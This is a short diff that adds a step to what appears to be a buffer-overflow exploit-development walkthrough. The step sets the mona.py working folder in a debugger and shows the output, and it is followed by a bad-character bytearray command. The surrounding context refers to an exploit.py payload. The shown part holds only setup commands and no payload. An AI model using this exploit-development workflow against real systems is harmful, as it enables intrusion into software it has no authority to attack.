@@ -67,6 +67,20 @@ vim exploit.py # PAYLOAD: (output above)
 ```
 
 ```bash
+!mona config -set workingfolder c:\mona\%p
+
+# output
+0BADF00D   [+] Command used:
+0BADF00D   !mona config -set workingfolder c:\mona\%p
+0BADF00D   Writing value to configuration file
+0BADF00D   Old value of parameter workingfolder =
+0BADF00D   [+] Creating config file, setting parameter workingfolder
+0BADF00D   New value of parameter workingfolder =  c:\mona\%p
+0BADF00D
+0BADF00D   [+] This mona.py action took 0:00:00
+```
+
+```bash
 !mona bytearray -b "\x00"
 
 # output
